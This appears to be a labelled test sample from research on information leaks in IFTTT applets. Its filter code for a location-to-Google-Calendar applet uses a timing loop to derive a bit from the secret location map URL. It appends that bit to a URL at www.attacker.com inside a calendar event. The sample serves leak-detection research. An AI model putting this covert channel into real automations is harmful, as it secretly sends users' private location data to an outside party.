//Maker: rothgar
//Link2Applet: https://ifttt.com/applets/133380p-track-your-work-hours-in-google-calendar
//Title of Applet:  Track your work hours in Google Calendar
//Trigger service: Location
//Action service: Google Calendar
//Policy/Presence:  Confidentiality of Location / YES


when = 'Location.enterOrExitRegionLocation.OccurredAt';
what = 'Location.enterOrExitRegionLocation.EnteredOrExited';
map = lbl('Location.enterOrExitRegionLocation.LocationMapUrl');

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (map.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 

attack = urll("www.attacker.com?" + res);

sink('GoogleCalendar.quickAddEvent', 'setQuickAdd', when + ": I " +  what + " the area " + attack);


